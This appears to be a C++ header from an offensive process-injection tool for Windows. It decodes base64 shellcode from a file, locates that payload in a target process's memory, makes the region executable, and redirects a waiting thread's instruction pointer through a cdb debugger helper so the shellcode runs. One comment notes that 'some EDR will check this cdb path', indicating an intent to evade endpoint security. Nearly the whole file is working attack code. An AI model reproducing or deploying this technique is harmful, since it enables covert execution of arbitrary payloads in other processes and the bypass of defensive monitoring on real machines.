#pragma once
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <string>
#include <vector>
#include <optional>
#include <iostream>

#include "ViaCdb.h"

std::optional<uintptr_t> FindPatternInRemoteProcess(
    HANDLE hProcess,
    const std::vector<uint8_t>& pattern)
{
    if (pattern.empty())
        return std::nullopt;

    SYSTEM_INFO sysInfo{};
    GetNativeSystemInfo(&sysInfo);

    const uintptr_t minAddr = reinterpret_cast<uintptr_t>(sysInfo.lpMinimumApplicationAddress);
    const uintptr_t maxAddr = reinterpret_cast<uintptr_t>(sysInfo.lpMaximumApplicationAddress);
    const size_t patternSize = pattern.size();

    constexpr size_t CHUNK_SIZE = 1 * 1024 * 1024; // 1 MB
    std::vector<uint8_t> buffer;
    buffer.reserve(CHUNK_SIZE + patternSize);

    uintptr_t address = minAddr;
    MEMORY_BASIC_INFORMATION mbi{};

    while (address < maxAddr) {
        if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(address),
            &mbi, sizeof(mbi)) == 0) {
            address += sysInfo.dwPageSize;
            continue;
        }

        const uintptr_t regionBase = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
        const uintptr_t regionEnd = regionBase + mbi.RegionSize;

        const bool isPrivate = (mbi.Type == MEM_PRIVATE);
        const bool isCommitted = (mbi.State == MEM_COMMIT);
        const bool isReadable = (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE |
            PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
            PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY)) != 0;
        const bool isGuarded = (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) != 0;

        if (isPrivate && isCommitted && isReadable && !isGuarded &&
            mbi.RegionSize >= patternSize) {

            uintptr_t chunkAddr = regionBase;
            size_t carry = 0; // bytes carried from previous chunk for boundary matches

            while (chunkAddr < regionEnd) {
                const size_t toRead = static_cast<size_t>(
                    std::min<size_t>(CHUNK_SIZE, regionEnd - chunkAddr));

                buffer.resize(carry + toRead);
                SIZE_T bytesRead = 0;

                if (!ReadProcessMemory(hProcess,
                    reinterpret_cast<LPCVOID>(chunkAddr),
                    buffer.data() + carry,
                    toRead,
                    &bytesRead) || bytesRead == 0) {
                    // If a chunk fails, skip the rest of this region.
                    // You could fall back to page-by-page reads here if needed.
                    break;
                }

                const size_t total = carry + bytesRead;

                if (total >= patternSize) {
                    const size_t limit = total - patternSize;
                    for (size_t i = 0; i <= limit; ++i) {
                        if (memcmp(buffer.data() + i, pattern.data(), patternSize) == 0) {
                            // buffer[i] corresponds to this remote address:
                            return chunkAddr - carry + i;
                        }
                    }
                }

                // Keep the last patternSize-1 bytes for the next chunk.
                carry = (patternSize > 1) ? (std::min)(patternSize - 1, total) : 0;
                if (carry > 0) {
                    memmove(buffer.data(), buffer.data() + total - carry, carry);
                }

                chunkAddr += bytesRead;
            }
        }

        address = regionEnd;
    }

    return std::nullopt;
}

// ---------------------------------------------------------------------------
// Minimal base64 decoder.
// Ignores whitespace / newlines. Returns empty vector on malformed input.
// ---------------------------------------------------------------------------
static std::vector<uint8_t> Base64Decode(const std::string& in)
{
    auto val = [](char c) -> int {
        if (c >= 'A' && c <= 'Z') return c - 'A';
        if (c >= 'a' && c <= 'z') return c - 'a' + 26;
        if (c >= '0' && c <= '9') return c - '0' + 52;
        if (c == '+') return 62;
        if (c == '/') return 63;
        return -1;   // padding or invalid
        };

    std::vector<uint8_t> out;
    out.reserve(in.size() * 3 / 4 + 3);

    int      buf = 0;
    int      bits = 0;

    for (char c : in) {
        if (c == '=') break;                 // padding → done
        if (c == '\r' || c == '\n' || c == ' ' || c == '\t') continue;

        int v = val(c);
        if (v < 0) {                          // invalid char
            std::fwprintf(stderr, L"[!] Invalid base64 character: '%c' (0x%02X)\n",
                (wint_t)c, (unsigned char)c);
            return {};
        }

        buf = (buf << 6) | v;
        bits += 6;

        if (bits >= 8) {
            bits -= 8;
            out.push_back(static_cast<uint8_t>((buf >> bits) & 0xFF));
        }
    }
    return out;
}

// ---------------------------------------------------------------------------
// Find the main thread of a process (lowest TID owned by that PID).
// ---------------------------------------------------------------------------
typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength);

#define SystemProcessInformation  5
#define ThreadStateWaiting        5
#define WaitReasonWrQueue         15

typedef struct _MSYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG         WaitTime;
    PVOID         StartAddress;
    CLIENT_ID     ClientId;
    KPRIORITY     Priority;
    LONG          BasePriority;
    ULONG         ContextSwitches;
    ULONG         ThreadState;
    ULONG         WaitReason;
} MSYSTEM_THREAD_INFORMATION;

typedef struct _MSYSTEM_PROCESS_INFORMATION {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    LARGE_INTEGER  WorkingSetPrivateSize;
    ULONG          HardFaultCount;
    ULONG          NumberOfThreadsHighWatermark;
    ULONGLONG      CycleTime;
    LARGE_INTEGER  CreateTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY      BasePriority;
    HANDLE         UniqueProcessId;
    HANDLE         InheritedFromUniqueProcessId;
    ULONG          HandleCount;
    ULONG          SessionId;
    ULONG_PTR      UniqueProcessKey;
    SIZE_T         PeakVirtualSize;
    SIZE_T         VirtualSize;
    ULONG          PageFaultCount;
    SIZE_T         PeakWorkingSetSize;
    SIZE_T         WorkingSetSize;
    SIZE_T         QuotaPeakPagedPoolUsage;
    SIZE_T         QuotaPagedPoolUsage;
    SIZE_T         QuotaPeakNonPagedPoolUsage;
    SIZE_T         QuotaNonPagedPoolUsage;
    SIZE_T         PagefileUsage;
    SIZE_T         PeakPagefileUsage;
    SIZE_T         PrivatePageCount;
    LARGE_INTEGER  ReadOperationCount;
    LARGE_INTEGER  WriteOperationCount;
    LARGE_INTEGER  OtherOperationCount;
    LARGE_INTEGER  ReadTransferCount;
    LARGE_INTEGER  WriteTransferCount;
    LARGE_INTEGER  OtherTransferCount;
    SYSTEM_THREAD_INFORMATION Threads[1];
} MSYSTEM_PROCESS_INFORMATION;

static DWORD GetMainThreadId02(DWORD pid)
{
    static pNtQuerySystemInformation NtQuerySystemInformation =
        reinterpret_cast<pNtQuerySystemInformation>(
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                "NtQuerySystemInformation"));

    if (!NtQuerySystemInformation) {
        std::fwprintf(stderr, L"Failed to resolve NtQuerySystemInformation.\n");
        return 0;
    }

    ULONG size = 1 << 20;
    std::vector<BYTE> buffer(size);
    NTSTATUS status;
    for (;;) {
        status = NtQuerySystemInformation(
            SystemProcessInformation, buffer.data(),
            static_cast<ULONG>(buffer.size()), &size);
        if (status == static_cast<NTSTATUS>(0xC0000004L)) { // STATUS_INFO_LENGTH_MISMATCH
            buffer.resize(buffer.size() * 2);
            continue;
        }
        break;
    }

    if (status != 0) {
        std::fwprintf(stderr, L"NtQuerySystemInformation failed. status = 0x%08X\n",
            static_cast<unsigned>(status));
        return 0;
    }

    BYTE* ptr = buffer.data();
    for (;;) {
        auto* spi = reinterpret_cast<MSYSTEM_PROCESS_INFORMATION*>(ptr);

        if (static_cast<DWORD>(reinterpret_cast<ULONG_PTR>(spi->UniqueProcessId)) == pid) {
            for (ULONG i = 0; i < spi->NumberOfThreads; ++i) {
                const auto& t = spi->Threads[i];
                if (t.ThreadState == ThreadStateWaiting &&
                    t.WaitReason == WaitReasonWrQueue)
                {
                    return static_cast<DWORD>(
                        reinterpret_cast<ULONG_PTR>(t.ClientId.UniqueThread));
                }
            }
            return 0;
        }

        if (spi->NextEntryOffset == 0)
            break;
        ptr += spi->NextEntryOffset;
    }

    return 0;
}
static DWORD GetMainThreadId(DWORD pid)
{
    DWORD mainTid = 0;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        std::fwprintf(stderr, L"CreateToolhelp32Snapshot failed. GetLastError = %lu\n",
            GetLastError());
        return 0;
    }

    THREADENTRY32 te{};
    te.dwSize = sizeof(te);

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                if (mainTid == 0 || te.th32ThreadID < mainTid)
                    mainTid = te.th32ThreadID;
            }
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    return mainTid;
}

typedef NTSTATUS(NTAPI* pNtSuspendProcess)(HANDLE ProcessHandle);
typedef NTSTATUS(NTAPI* pNtResumeProcess)(HANDLE ProcessHandle);


// ---------------------------------------------------------------------------
// Suspend thread, set RIP to targetAddr, resume.
// ---------------------------------------------------------------------------

static bool RedirectThreadRip(DWORD pid, DWORD tid, LPVOID targetAddr)
{

    HANDLE hProc = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
    if (!hProc) { printf("OpenProcess failed: %lu\n", GetLastError()); return 1; }

    ////
    HANDLE hThread = OpenThread(
        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
        FALSE, tid);

    if (!hThread) {
        std::fwprintf(stderr, L"OpenThread(%lu) failed. GetLastError = %lu\n",
            tid, GetLastError());
        return false;
    }
    alignas(16) CONTEXT ctx {};
    ctx.ContextFlags = CONTEXT_CONTROL;

    if (!GetThreadContext(hThread, &ctx)) {
        std::fwprintf(stderr, L"GetThreadContext failed. GetLastError = %lu\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    std::wprintf(L"[*] Old RIP = 0x%016llX  RSP = 0x%016llX\n",
        (unsigned long long)ctx.Rip,
        (unsigned long long)ctx.Rsp);

    ctx.Rip = reinterpret_cast<DWORD64>(targetAddr);

    std::wprintf(L"[*] New RIP = 0x%016llX\n", (unsigned long long)ctx.Rip);

    CloseHandle(hProc);
    CloseHandle(hThread);
    return TRUE;
}

static void PrintLastError(const char* fn) {
    DWORD err = GetLastError();
    LPSTR buf = nullptr;
    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&buf, 0, nullptr);
    std::printf("[!] %s failed (err %lu): %s\n", fn, err, buf ? buf : "unknown");
    if (buf) LocalFree(buf);
}

std::vector<uint8_t> ReadSCFromFile(const char* base64SCFile)
{
    // ---- Collect the base64 string ----
    std::string b64;
    std::vector<uint8_t> payload;
    FILE* f = nullptr;
    errno_t err = fopen_s(&f, base64SCFile, "rb");
    if (err != 0 || f == nullptr) {
        std::fprintf(stderr, "Cannot open file: %s (errno=%d)\n", base64SCFile, err);

        return payload;
    }

    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return payload; }
    long sz = ftell(f);
    if (sz < 0) { fclose(f); return payload; }
    if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return payload; }

    b64.resize(static_cast<size_t>(sz));
    if (!b64.empty()) {
        // &b64[0] is char* — non-const even in C++11/14
        size_t got = fread(&b64[0], 1, b64.size(), f);
        b64.resize(got);
    }
    fclose(f);
    // ---- Decode ----
    payload = Base64Decode(b64);
    if (payload.empty()) {
        std::fwprintf(stderr, L"[!] Base64 decode produced 0 bytes.\n");
        return payload;
    }
    std::printf("[*] B64 length    : %zu chars\n", b64.size());
    std::printf("[*] Decoded size  : %zu bytes\n", payload.size());
    return payload;
}

// ---------------------------------------------------------------------------
BOOL ExecuteSC(DWORD pid, std::vector<uint8_t> payload, std::wstring cdbPath)
{

    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        std::fwprintf(stderr, L"OpenProcess failed. GetLastError = %lu\n", GetLastError());
        return FALSE;
    }
    std::wprintf(L"[+] OpenProcess OK (handle = %p)\n", hProcess);
    size_t bytesToCopy = std::min<size_t>(payload.size(), 16);
    std::vector<uint8_t> payloadInput(payload.begin(), payload.begin() + bytesToCopy);

    auto result = FindPatternInRemoteProcess(hProcess, payloadInput);
    if (!result) {
        std::cout << "Pattern not found in remote process memory now. Wait and search again\n";
        Sleep(1000);
        result = FindPatternInRemoteProcess(hProcess, payload);
    }


    if (result) {
        std::cout << "Found at remote address: 0x" << std::hex << *result << std::dec << "\n";

        SIZE_T  size = (SIZE_T)payload.size();
        DWORD   newProtect = (DWORD)PAGE_EXECUTE_READWRITE;
        MEMORY_BASIC_INFORMATION mbi{};

        if (VirtualQueryEx(hProcess, (LPCVOID)*result, &mbi, sizeof(mbi)))
        {
            std::printf("[+] Region @ %p: base=%p size=0x%zX state=0x%lX protect=0x%lX type=0x%lX\n",
                *result, mbi.BaseAddress, mbi.RegionSize,
                mbi.State, mbi.Protect, mbi.Type);
        }
        else {
            PrintLastError("VirtualQueryEx (continuing anyway)");
        }
        DWORD oldProt = 0;
        if (!VirtualProtectEx(hProcess, (LPVOID)*result, size, newProtect, &oldProt)) {
            PrintLastError("VirtualProtectEx");
            CloseHandle(hProcess); return FALSE;
        }
        std::printf("[+] VirtualProtectEx OK: 0x%llX size=%zu  old=0x%lX new=0x%lX\n\n",
            (unsigned long long) * result, (size_t)size, oldProt, newProtect);

        //std::cout << "Enter to continue !" << std::endl;
        //std::cin.get();

        DWORD mainTid = GetMainThreadId02(pid);
        if (!mainTid) {
            std::printf("[!] Could not find  thread for PID %lu\n", pid);
            CloseHandle(hProcess); return FALSE;
        }
        std::printf("[+] Target thread TID = %lu\n", mainTid);

		//some EDR will check this cdb path, change it if you want to test in your environment
		//std::wstring cdbPath = L"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\cdb.exe"; // Adjust path to cdb.exe as needed
        //std::wstring cdbPath = L"C:\\Run\\sample\\cdb\\cdb.exe"; // Adjust path to cdb.exe as needed

		bool tmp = ChangeThreadRipViaCdb(cdbPath, pid, mainTid, (ULONG64)*result);


        std::printf("\n[+] Done. Target thread now executing at 0x%llX\n",
            (unsigned long long) * result);
        CloseHandle(hProcess); return TRUE;;
        //
    }
    else {
        std::cout << "Pattern not found.\n";
        CloseHandle(hProcess); return FALSE;
    }
    //
    
}